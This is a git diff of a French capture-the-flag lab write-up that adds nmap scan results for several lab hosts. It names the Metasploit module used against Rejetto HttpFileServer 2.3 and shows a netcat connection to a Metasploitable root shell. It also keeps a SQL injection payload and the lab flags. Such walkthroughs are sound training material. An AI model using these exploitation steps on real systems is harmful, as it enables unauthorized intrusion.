@@ -42,7 +42,6 @@ Le routeur 10.10.40.1 n'est pas pris en compte pour les exploitations. Quant aux
 
 ``````shell
 nmap -p0-65535 10.10.40.X -v		//le x correspond au poste
-ou
 nmap -sV --allport 10.10.40.x		
 ``````
 
@@ -55,24 +54,54 @@ nmap -sV --allport 10.10.40.x
 Lors du scan de cette machine, nous avons pu constater qu'il y avait le port 80 ouvert et que le service http est activé dessus. On a donc essayé de se connecter avec un navigateur web. Sur la page web à l'adresse de la machine, on a pu y lire la version du serveur HTTP.
 
 ``````shell
-afficher sortie nmap .......................................
+nmap -Pn -p0-65535 10.10.40.13 -v
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-16 09:29 BST
+Initiating Parallel DNS resolution of 1 host. at 09:29
+Completed Parallel DNS resolution of 1 host. at 09:29, 0.00s elapsed
+Initiating SYN Stealth Scan at 09:29
+Scanning 10.10.40.13 [65536 ports]
+Discovered open port 80/tcp on 10.10.40.13
+SYN Stealth Scan Timing: About 18.11% done; ETC: 09:32 (0:02:20 remaining)
+SYN Stealth Scan Timing: About 44.57% done; ETC: 09:31 (0:01:16 remaining)    
+Completed SYN Stealth Scan at 09:31, 110.20s elapsed (65536 total ports)    
+Nmap scan report for 10.10.40.13                               
+Host is up (0.015s latency).                                   
+Not shown: 65535 filtered ports                               
+PORT   STATE SERVICE                                         
+80/tcp open  http                                          
+Read data files from: /usr/bin/../share/nmap            
+Nmap done: 1 IP address (1 host up) scanned in 110.31 seconds    
+Raw packets sent: 131153 (5.771MB) | Rcvd: 83 (3.652KB) 
 ``````
 
-Le service correspond à un `HttpFileServer` en version `2.3`. Puis à l'aide de `searchsploit`, on a regardé les potentielles vulnérabilités pour ce service.
+Le service correspond à un `HttpFileServer` en version `2.3`. Puis à l'aide de `search`, on a regardé les potentielles vulnérabilités pour ce service.
 
-``````
-//afficher les modules de searchsploit
-..........................
+``````shell
+#Recherche d'un exploit avec search
+msf5 > search hfs
 
+Matching Modules
+================
+
+   #  Name                                        Disclosure Date  Rank       Check  Description
+   -  ----                                        ---------------  ----       -----  -----------
+   0  exploit/multi/http/git_client_command_exec  2014-12-18       excellent  No     Malicious Git and Mercurial HTTP Server For CVE-2014-9390
+   1  exploit/windows/http/rejetto_hfs_exec       2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
 ``````
 
 Nous avons utilisé la vulnérabilité suivante pour effectuer un exploit :
 
-``````
-nom .........................
-``````
+``````shell
+exploit/windows/http/rejetto_hfs_exec
 
-Choix de `exploit/windows/http/rejetto_hfs_exec` car ................................................................
+#description du module
+  Rejetto HttpFileServer (HFS) is vulnerable to remote command 
+  execution attack due to a poor regex in the file ParserLib.pas. This 
+  module exploits the HFS scripting commands by using '%00' to bypass 
+  the filtering. This module has been tested successfully on HFS 2.3b 
+  over Windows XP SP3, Windows 7 SP1 and Windows 8.
+``````
 
 Ensuite avec `msfconsole`, on a configuré et lancé l'exploit de la manière suivante :
 
@@ -104,11 +133,47 @@ cat flag.txt									//affiche le contenu du fichier flag.txt
 
 ``````shell
 #Scan des ports avec 
-nmap -p0-65535 10.10.40.85
-......................................
+nmap -sV -p0-65535 10.10.40.85
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-16 09:44 BST
+Nmap scan report for 10.10.40.85
+Host is up (0.019s latency).
+Not shown: 65505 closed ports
+PORT      STATE    SERVICE      VERSION
+0/tcp     filtered unknown
+21/tcp    open     ftp          vsftpd 2.3.4
+22/tcp    open     ssh          OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+23/tcp    open     telnet       Linux telnetd
+25/tcp    open     smtp         Postfix smtpd
+53/tcp    open     domain       ISC BIND 9.4.2
+80/tcp    open     http         Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+111/tcp   open     rpcbind      2 (RPC #100000)
+139/tcp   open     netbios-ssn  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp   open     netbios-ssn  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+512/tcp   open     exec         netkit-rsh rexecd
+513/tcp   open     login?
+514/tcp   open     shell        Netkit rshd
+1099/tcp  open     rmiregistry?
+1524/tcp  open     bindshell    Metasploitable root shell
+2049/tcp  open     nfs          2-4 (RPC #100003)
+2121/tcp  open     ftp          ProFTPD 1.3.1
+3306/tcp  open     mysql        MySQL 5.0.51a-3ubuntu5
+3632/tcp  open     distccd      distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+5432/tcp  open     postgresql   PostgreSQL DB 8.3.0 - 8.3.7
+5900/tcp  open     vnc          VNC (protocol 3.3)
+6000/tcp  open     X11          (access denied)
+6667/tcp  open     irc          UnrealIRCd
+6697/tcp  open     irc          UnrealIRCd
+8009/tcp  open     ajp13        Apache Jserv (Protocol v1.3)
+8180/tcp  open     http         Apache Tomcat/Coyote JSP engine 1.1
+8787/tcp  open     drb          Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
+32991/tcp open     unknown
+41276/tcp open     mountd       1-3 (RPC #100005)
+41771/tcp open     status       1 (RPC #100024)
+52984/tcp open     nlockmgr     1-4 (RPC #100021)
 ``````
 
-Suite au scan des ports, on a découvert que sur le port 1524 de la machine il y avait un service nommé `Metasploitable Root Shell`. Celui-ci est une ...... On s'y est donc connecté avec un `netcat`. 
+Suite au scan des ports, on a découvert que sur le port 1524 de la machine il y avait un service nommé `Metasploitable Root Shell`. On s'y est donc connecté avec un `netcat`. 
 
 ``````shell
 nc 10.10.40.85 1524
@@ -131,8 +196,15 @@ Le flag de cette machine est : `AST16{m3745p1017_p0w3r_700_345y}`
 
 ````shell
 #Scan des ports avec
+nmap -sV -p0-65535 10.10.40.122
 
-sortie ............................................
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-16 09:49 BST
+Nmap scan report for 10.10.40.122
+Host is up (0.016s latency).
+Not shown: 65534 closed ports
+PORT     STATE    SERVICE     VERSION
+0/tcp    filtered unknown
+8080/tcp open     http-proxy?
 ````
 
 Sur cette machine, on peut voir qu'il y a uniquement le port 8080 qui est ouvert avec un service web derrière. On s'est donc connecté via l'URL suivante : `http://10.10.40.122:8080` et nous avons obtenu la page web de base du serveur web `Tomcat`. On a parcouru les différents liens de la page et avons constaté qu'il fallait des identifiants pour se connecter au `manager webapp`.
@@ -182,8 +254,15 @@ Le flag de cette machine est : ` AST16{d3f4u17_cr3d5_3v3rywh3r3}`
 
 ````shell
 #Scan des ports avec 
-nmap 
-sortie ...............................................
+nmap -sV -p0-65535 10.10.40.128
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-16 09:55 BST
+Nmap scan report for 10.10.40.128
+Host is up (0.026s latency).
+Not shown: 65534 closed ports
+PORT   STATE    SERVICE VERSION
+0/tcp  filtered unknown
+80/tcp open     http    Apache httpd 2.2.11 ((Ubuntu) PHP/5.2.6-3ubuntu4 with Suhosin-Patch)
 ````
 
 .......................
@@ -237,7 +316,16 @@ Dans le dossier `/root`, on peut trouver le fichier `flag.txt`. Avec la commande
 
 ````shell
 #Scan des ports avec
-nmap .............................................
+nmap -sV -p0-65535 10.10.40.138 
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-07 14:50 BST
+Nmap scan report for 10.10.40.138
+Host is up (0.013s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ````
 
 Avec le scan de port, on trouve le service `ssh` qui tourne sur le port 22 ainsi qu'un service `http` sur le port 80. Nous nous sommes donc connectées avec un navigateur web à l'URL suivante : `http://10.10.40.138`. On peut voir qu'il y a un formulaire de connexion. Ceci implique qu'il y a une base de données derrière et une attaque d'injection SQL est potentiellement possible.
@@ -275,6 +363,25 @@ admin' UNION SELECT fl4g, 1, 2 FROM s3cr3t_t4ble#:
 
 #### Host 10.10.40.168
 
+````shell
+#Scan des ports avec
+nmap -sV -p0-65535 10.10.40.168
+
+tarting Nmap 7.80 ( https://nmap.org ) at 2020-10-07 16:50 BST
+Nmap scan report for 10.10.40.168
+Host is up (0.015s latency).
+Not shown: 993 filtered ports
+PORT      STATE SERVICE VERSION
+53/tcp    open  domain  Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
+80/tcp    open  http    Apache Tomcat/Coyote JSP engine 1.1
+135/tcp   open  msrpc   Microsoft Windows RPC
+8009/tcp  open  ajp13   Apache Jserv (Protocol v1.3)
+49154/tcp open  msrpc   Microsoft Windows RPC
+49155/tcp open  msrpc   Microsoft Windows RPC
+49157/tcp open  msrpc   Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows
+````
+
 Dans un premier temps, on est redirigé vers l'adresse `http://www.corporation-sa.com` . On peut voir que le DNS ne peut résoudre l'adresse. Ceci insinue que l'adresse est sur un DNS interne. Il faut donc modifier le fichier `/etc/hosts`.
 
 ```shell
@@ -294,6 +401,9 @@ nslookup
 Lors du scan des ports, on se retrouve avec la liste suivante :
 
 ``````shell
+#Scan des ports avec
+nmap -sV -p0-65535 10.10.40.231s
+
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-09 14:52 BST
 Initiating Ping Scan at 14:52
 Scanning 10.10.40.231 [4 ports]
